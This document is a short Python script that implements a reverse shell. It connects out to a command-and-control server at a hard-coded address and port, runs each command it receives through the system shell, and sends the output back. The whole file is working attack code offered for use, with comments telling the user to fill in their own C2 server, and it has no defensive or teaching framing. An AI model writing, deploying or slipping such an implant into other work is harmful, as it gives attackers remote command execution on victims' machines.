import socket
import subprocess
import os

def reverse_shell(server_ip, server_port):
    try:
        # Connect to the C2 server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))

        while True:
            # Receive command from the server
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break

            # Execute the command and send the result back
            if command.startswith('cd '):
                try:
                    os.chdir(command.strip('cd '))
                    s.send(b'Changed directory')
                except FileNotFoundError as e:
                    s.send(str(e).encode('utf-8'))
            else:
                result = subprocess.run(command, shell=True, capture_output=True)
                s.send(result.stdout + result.stderr)

    except Exception as e:
        s.send(f"Error: {e}".encode('utf-8'))

    finally:
        s.close()

if __name__ == "__main__":
    # Replace these with the actual IP and port of your C2 server
    SERVER_IP = '172.17.0.1'
    SERVER_PORT = 9999
    reverse_shell(SERVER_IP, SERVER_PORT)
